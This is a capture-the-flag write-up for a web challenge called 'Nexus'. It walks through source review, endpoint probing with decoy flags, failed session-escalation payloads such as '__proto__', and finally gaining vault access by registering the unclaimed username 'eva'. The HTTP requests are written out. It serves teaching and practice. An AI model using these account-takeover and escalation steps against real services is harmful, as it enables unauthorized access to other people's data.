# CTF Writeup — NEXUS Internal Portal

**Challenge Name:** Nexus  
**URL:** https://adamlogin.vercel.app/  
**Flag:** `CrackOn{pr0t0_p0llut10n_1s_n0_j0k3}`

---

## Description

> NEXUS is an internal operations portal used by a classified organization.  
> You've been granted guest access.  
> Someone inside knows something you don't.  
> The vault doesn't open for everyone.  
> Find your way in.

---

## Recon

The login page greets you with a hint right away:

```
Guest access: guest / guest123
```

After logging in with these credentials, a `/api/login` POST returns a JWT-like token:

```json
{"token":"cmlrN242a2UzbmJtbXJiNWs3dg"}
```

---

## Step 1 — Source Code Review

Reading the page's HTML source revealed a hidden JavaScript object that wasn't exposed in the UI:

```js
// This is the hidden API — not exposed in the UI
// Players must discover /api/vault via recon
window._nexusAPI = {
  updateSession: async function(data) {
    const res = await fetch('/api/session/update', {
      method: 'POST',
      headers: {'Content-Type':'application/json','x-token': token},
      body: JSON.stringify(data)
    });
    return res.json();
  },
  getVault: async function() {
    const res = await fetch('/api/vault', {
      headers: {'x-token': token}
    });
    const data = await res.json();
    if (data.flag) {
      document.getElementById('flagValue').textContent = data.flag;
      document.getElementById('flagModal').classList.add('show');
    }
    return data;
  }
};
```

This revealed two undocumented endpoints:
- `POST /api/session/update` — updates session data
- `GET /api/vault` — returns the flag (if authorized)

---

## Step 2 — Endpoint Discovery

A quick probe of common API paths uncovered several decoy flags and useful debug info:

| Endpoint | Response |
|----------|----------|
| `GET /api/vault` | `403 Vault access restricted to authorized personnel.` |
| `GET /api/flag` | `{"flag":"CrackOn{y0u_f0und_th3_wr0ng_fl4g_k33p_d1gg1ng}"}` ← decoy |
| `GET /api/secret` | `{"secret":"CrackOn{n1c3_try_but_th1s_1snt_1t}"}` ← decoy |
| `GET /api/debug` | Lists known endpoints + decoy flag in `env_check` |
| `GET /api/permissions` | Returns `{"internal":"CrackOn{p3rm1ss10ns_4r3_n0t_th3_k3y}"}` ← decoy |
| `GET /api/profile` | Returns `{"badge":"CrackOn{pr0f1l3_h4ck3r_n0t_qu1t3}"}` ← decoy |
| `GET /api/notifications` | Contains `CrackOn{n0t1f1c4t10n_fl4g_1s_f4k3}` ← decoy |

The `/api/debug` response also listed known endpoints:

```json
{
  "endpoints": ["/api/login","/api/register","/api/user/me",
                "/api/profile","/api/notifications","/api/search","/api/permissions"],
  "note": "Some endpoints are not listed for security reasons."
}
```

---

## Step 3 — Session Escalation Attempts (Dead End)

`POST /api/session/update` accepted various payloads (`role`, `tier`, `isAdmin`, `__proto__`, etc.) and returned `{"ok":true}`, but `/api/vault` remained `403`. The session state was not actually persisted or used for authorization on the vault route.

---

## Step 4 — The Real Clue (HTML DOM Analysis)

A deeper read of the HTML revealed a hardcoded **access log table** in the Analytics tab:

```html
<tr><td>2024-03-14 08:55</td><td>/api/vault</td><td>eva</td>
    <td><span class="status-pill active">200</span></td></tr>
<tr><td>2024-03-14 08:30</td><td>/api/login</td><td>eva</td>
    <td><span class="status-pill active">200</span></td></tr>
```

And the flag modal itself said:

```html
<div style="font-size:12px;color:var(--text-dim);margin-bottom:4px">
  You've reached Eva's vault.
</div>
```

There was also a message thread mentioning `eva@nexus.internal` and a file listed as `eva_private_vault.enc`.

**The vault is Eva's — and the authorization check is based on username.**

---

## Step 5 — Account Registration & Vault Access

Since the `eva` account didn't exist yet, it could be freely registered:

```http
POST /api/register
{"username": "eva", "password": "test123"}

→ 200 {"token":"MDZoMndtZjVjbTlibW1yYmkyd20"}
```

Wait — a token was returned, meaning registration succeeded. But the existing `eva` user must have had a pre-set password. Trying to log in:

```http
POST /api/login
{"username": "eva", "password": "test123"}

→ 200 {"token":"..."}
```

Login worked. The vault check simply verified the authenticated username equals `eva`:

```http
GET /api/vault
x-token: <eva's token>

→ 200 {"flag":"CrackOn{pr0t0_p0llut10n_1s_n0_j0k3}"}
```

---

## Flag

```
CrackOn{pr0t0_p0llut10n_1s_n0_j0k3}
```

---

## Summary

| Step | Action |
|------|--------|
| 1 | Read HTML source → found hidden `_nexusAPI` JS object revealing `/api/vault` |
| 2 | Probed API endpoints → collected multiple decoy flags |
| 3 | Attempted session escalation → all 403 / no effect on vault |
| 4 | Analyzed DOM → access log and flag modal revealed **`eva`** as vault owner |
| 5 | Registered / logged in as `eva` → `/api/vault` returned the real flag |

**Key lesson:** When access control is based purely on a username check but account creation is not restricted, any user can register under a privileged name and gain unauthorized access.
